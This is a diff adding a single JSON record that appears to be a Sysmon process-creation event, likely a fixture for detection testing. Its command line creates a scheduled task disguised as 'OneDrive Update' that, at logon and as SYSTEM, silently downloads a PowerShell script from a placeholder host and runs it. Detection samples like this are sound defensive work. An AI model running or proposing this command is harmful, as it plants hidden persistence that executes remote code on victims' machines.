@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-03 13:40:30.000",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "Image": "C:\\Windows\\System32\\schtasks.exe",
+  "CommandLine": "schtasks.exe /create /tn \"OneDrive Update\" /tr \"powershell.exe -w hidden -c irm https://cdn.stage.invalid/update.ps1 | iex\" /sc onlogon /ru SYSTEM",
+  "User": "NT AUTHORITY\\SYSTEM"
+}
